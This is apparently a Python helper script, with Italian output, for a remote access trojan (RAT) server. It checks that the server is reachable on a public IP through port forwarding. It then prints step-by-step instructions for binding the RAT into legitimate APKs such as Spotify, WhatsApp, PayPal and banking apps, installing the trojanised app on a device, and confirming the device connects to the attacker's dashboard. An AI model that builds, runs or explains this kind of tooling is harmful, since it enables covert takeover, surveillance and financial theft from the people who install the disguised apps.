#!/usr/bin/env python3
"""
🌐 TEST IP PUBBLICO per Nuovo Binding Method
Verifica se il sistema è pronto per test con IP pubblico
"""

import requests
import socket
import subprocess
import time

def test_local_server():
    """Test server locale"""
    print("🔍 Testing local server...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', 12000))
        sock.close()
        
        if result == 0:
            print("✅ Server locale attivo su porta 12000")
            return True
        else:
            print("❌ Server locale NON attivo su porta 12000")
            return False
    except Exception as e:
        print(f"⚠️ Errore test locale: {e}")
        return False

def test_local_http():
    """Test HTTP locale"""
    print("🔍 Testing local HTTP...")
    try:
        response = requests.get('http://127.0.0.1:12000', timeout=5)
        if response.status_code == 200 or response.status_code == 302:
            print("✅ HTTP locale funzionante")
            return True
        else:
            print(f"⚠️ HTTP locale risponde con status {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ HTTP locale non funzionante: {e}")
        return False

def get_public_ip():
    """Ottieni IP pubblico"""
    print("🔍 Getting public IP...")
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        ip = response.text.strip()
        print(f"📍 IP Pubblico: {ip}")
        return ip
    except Exception as e:
        print(f"⚠️ Impossibile ottenere IP pubblico: {e}")
        return "34.27.249.227"  # Fallback

def test_external_port(public_ip):
    """Test porta esterna"""
    print(f"🔍 Testing external port {public_ip}:12000...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        result = sock.connect_ex((public_ip, 12000))
        sock.close()
        
        if result == 0:
            print("✅ Porta esterna raggiungibile")
            return True
        else:
            print("❌ Porta esterna NON raggiungibile")
            print("   → Configura port forwarding: 12000 → 10.2.53.11:12000")
            return False
    except Exception as e:
        print(f"❌ Errore test porta esterna: {e}")
        return False

def test_external_http(public_ip):
    """Test HTTP esterno"""
    print(f"🔍 Testing external HTTP {public_ip}:12000...")
    try:
        response = requests.get(f'http://{public_ip}:12000', timeout=10)
        if response.status_code == 200 or response.status_code == 302:
            print("✅ HTTP esterno funzionante")
            return True
        else:
            print(f"⚠️ HTTP esterno risponde con status {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ HTTP esterno non funzionante: {e}")
        print("   → Verifica port forwarding e firewall")
        return False

def show_binding_config(public_ip):
    """Mostra configurazione per binding"""
    print("\n" + "="*60)
    print("🎯 CONFIGURAZIONE PER BINDING AVANZATO")
    print("="*60)
    print(f"🌐 URL Binding: http://{public_ip}:12000/bind_advanced")
    print(f"📍 Server IP: {public_ip}")
    print(f"🔌 Server Port: 12000")
    print(f"⚙️ Metodo: Auto-Detect (raccomandato)")
    print()
    print("📱 APK SUPPORTATI:")
    print("   🎵 Spotify, YouTube Music, SoundCloud")
    print("   📱 Instagram, WhatsApp, Telegram, TikTok")
    print("   🎮 PUBG, Fortnite, Among Us")
    print("   🛒 Amazon, eBay, AliExpress")
    print("   🏦 PayPal, Banking apps")
    print("   📺 Netflix, Disney+, YouTube")
    print("   🔧 Qualsiasi APK moderna!")

def show_test_procedure(public_ip):
    """Mostra procedura di test"""
    print("\n" + "="*60)
    print("📋 PROCEDURA TEST COMPLETA")
    print("="*60)
    print("1. 🔧 CONFIGURA PORT FORWARDING:")
    print("   Router → Port Forwarding → Aggiungi:")
    print("   Nome: RAT Server")
    print("   Porta Esterna: 12000")
    print("   IP Interno: 10.2.53.11")
    print("   Porta Interna: 12000")
    print("   Protocollo: TCP")
    print()
    print("2. 🌐 ACCEDI AL BINDING:")
    print(f"   http://{public_ip}:12000/bind_advanced")
    print()
    print("3. 📱 CONFIGURA BINDING:")
    print(f"   Server IP: {public_ip}")
    print("   Server Port: 12000")
    print("   Metodo: Auto-Detect")
    print()
    print("4. 📁 UPLOAD APK:")
    print("   - Spotify (120MB, obfuscato)")
    print("   - Instagram (150MB, protetto)")
    print("   - WhatsApp (100MB, crittografato)")
    print("   - Qualsiasi APK moderna")
    print()
    print("5. ⏳ ATTENDI BINDING:")
    print("   - Sistema analizza APK")
    print("   - Seleziona metodo ottimale")
    print("   - Binding automatico con fallback")
    print("   - Tempo: 2-5 minuti")
    print()
    print("6. 📥 SCARICA APK BINDATO:")
    print("   - APK firmato e pronto")
    print("   - Installa su dispositivo")
    print("   - Usa DATI MOBILI (non WiFi casa)")
    print()
    print("7. ✅ VERIFICA CONNESSIONE:")
    print("   - Apri app una volta")
    print("   - Controlla dashboard")
    print("   - Dispositivo deve apparire connesso")

def main():
    print("🔥 TEST IP PUBBLICO - Nuovo Binding Method")
    print("="*60)
    
    # Test locale
    local_ok = test_local_server()
    local_http_ok = test_local_http()
    
    # IP pubblico
    public_ip = get_public_ip()
    
    # Test esterno
    external_ok = test_external_port(public_ip)
    external_http_ok = test_external_http(public_ip)
    
    print("\n" + "="*60)
    print("📊 RISULTATI TEST")
    print("="*60)
    print(f"✅ Server Locale: {'✅' if local_ok else '❌'}")
    print(f"✅ HTTP Locale: {'✅' if local_http_ok else '❌'}")
    print(f"✅ Porta Esterna: {'✅' if external_ok else '❌'}")
    print(f"✅ HTTP Esterno: {'✅' if external_http_ok else '❌'}")
    
    if all([local_ok, local_http_ok, external_ok, external_http_ok]):
        print("\n🎉 TUTTO PRONTO PER TEST IP PUBBLICO!")
        show_binding_config(public_ip)
        print("\n💡 SUGGERIMENTO:")
        print("   Testa con APK complessi come Spotify o Instagram")
        print("   per verificare il nuovo sistema avanzato!")
        
    elif local_ok and local_http_ok:
        print("\n⚠️ SERVER LOCALE OK, MA IP PUBBLICO NON RAGGIUNGIBILE")
        print("\n🔧 AZIONI NECESSARIE:")
        print("1. Configura port forwarding sul router")
        print("2. Verifica firewall")
        print("3. Riprova test")
        show_test_procedure(public_ip)
        
    else:
        print("\n❌ PROBLEMI CON SERVER LOCALE")
        print("\n🔧 AZIONI NECESSARIE:")
        print("1. Avvia server RAT:")
        print("   cd /workspace/RAT")
        print("   python3 app.py")
        print("2. Riprova test")

if __name__ == "__main__":
    main()